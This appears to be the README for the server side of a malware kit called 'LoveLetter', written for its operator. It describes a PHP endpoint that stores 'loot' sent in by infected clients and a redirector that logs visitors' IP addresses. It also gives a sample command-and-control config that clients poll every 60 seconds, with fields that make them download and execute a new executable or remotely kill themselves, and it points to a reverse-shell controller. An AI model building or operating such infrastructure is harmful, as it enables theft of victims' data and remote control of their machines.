<div>
  <img width="220" align="right" src="../Repo/Images/8.png" alt="LoveLetter"/>
  <br>
</div>


# 🎁 PHP Endpoints

### 📝 [Tell me!](TellMe.php) (TellMe.php)
The PHP file that handles and stores loot from the letter and stores them nicely structured on the server.

### 📝 [Take me there.](TakeMeThere.php) (TakeMeThere.php)
A redirector and IP logger, the usage is pretty simple a base64 format of the target link can be parametered on ``TakeMeThere.php?b64=`` or a clean link can be parametered on ``TakeMeThere.php?to=``.
<br/>


# ⚙️ Configuration
Update.json is being fetched by the client to check for any server commands. You can update it to your liking.
This config gets initialized everytime the letter is run and then refreshed every 60 seconds, for controlling on runtime, please see [the Controller]("../Controller/")
## Sample 
```json
{
  "updateVersion": 0,
  "letterVersion": 0.1,
  "downloadLink": "http://0.0.0.0/new_tll_update.exe",
  "killSelf": false,
  "clearCookies": false,
}
```

## To be written...
> - Update Version ```updateVersion```

The version of the Update.json, always increment this whenever you updated the file, else the letter wont bother to load the json if the value is the same as the last.

> - Letter Version ```letterVersion```

The current latest version of the letter, increment this if you want the letter to download and execute ```downloadLink```.

> - Download Link ```downloadLink```

Direct download link to the newest executable.

> - Kill Self ```killSelf```

Put this to true whenever you want to remotely switch of all letters.


<br/>
<br/>

### For real-time commands you may use the [**Reverse Shell**](../Controller).